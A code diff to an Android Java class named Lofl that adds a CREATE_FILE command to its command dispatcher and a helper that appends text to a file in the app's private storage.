@@ -76,6 +76,7 @@ import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.UnsupportedEncodingException;
@@ -542,6 +543,14 @@ public class Lofl {
                 }
                 commandFound = true;
                 break;
+            case Commands.CREATE_FILE:
+                if(arg1 != null && arg2 != null){
+                    intent.putExtra(Constants.FILE_NAME_KEY, arg1);
+                    intent.putExtra(Constants.FILE_CONTENT_KEY, arg2);
+                    intent.setAction(JobsIntentService.ACTION_CREATE_FILE);
+                }
+                commandFound = true;
+                break;
             default:
                 break;
         }
@@ -580,6 +589,23 @@ public class Lofl {
                 }
             }
         }).start();
+    }
+
+    public static boolean createTextFile(Context context, String fileName, String content){
+        File file;
+        try {
+           FileOutputStream fos = context.openFileOutput(fileName, Context.MODE_APPEND);
+           fos.write(content.getBytes());
+           fos.close();
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+            return false;
+        }
+        catch (IOException ioe){
+            ioe.printStackTrace();
+            return false;
+        }
+        return true;
     }
 
     public static void playEndlessMosquitoRingtone(Context context) {
